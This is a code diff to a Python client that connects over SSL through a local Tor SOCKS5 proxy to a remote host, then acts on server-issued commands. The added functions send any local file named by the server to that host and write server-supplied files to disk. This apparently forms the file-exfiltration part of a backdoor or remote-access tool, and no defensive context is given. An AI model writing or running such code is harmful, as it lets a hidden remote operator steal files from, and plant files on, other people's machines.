@@ -7,6 +7,31 @@ def RecvData():
     # edit to handle "big" data 
     return temp
 
+def SendData(inText):
+    ssl_sock.write(inText)
+
+def UploadFILE(fileName):
+    fileUP = open(fileName, 'rb')
+    while 1:
+        tempData = fileUP.read()
+        if tempData == '':
+            break
+        else:
+            SendData(tempData)
+    fileUP.close()
+    SendData("CUF") #Client Upload Finished
+
+def DownloadFILE(fileName):
+    fileDOWN = open(fileName, 'wa')
+    while 1:
+        temp = RecvData()
+        if temp == 'SUF':
+            break
+        else: 
+            fileDOWN.write(temp)
+    fileDOWN.close()
+    SendData("CDF") #Client Download Finished
+
 sock = socks.socksocket()
 sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
 sock.connect((host,5555))
@@ -23,7 +48,13 @@ print pprint.pformat(ssl_sock.getpeercert())
 while 1:
 	#ssl_sock.write("boo!")
     inText = RecvData()
-    print '[inText] ' + inText
-    ssl_sock.write(inText)
+    if inText.startswith("download"):
+        UploadFILE(inText.split(" ")[1])
+        chunk = RecvData()
+    elif inText.startswith("upload"):
+        DownloadFILE(inText.split(" ")[1])
+    else:
+        print '[inText] ' + inText
+        SendData(inText)
     # def handle function to exit
 #    ssl_sock.close()
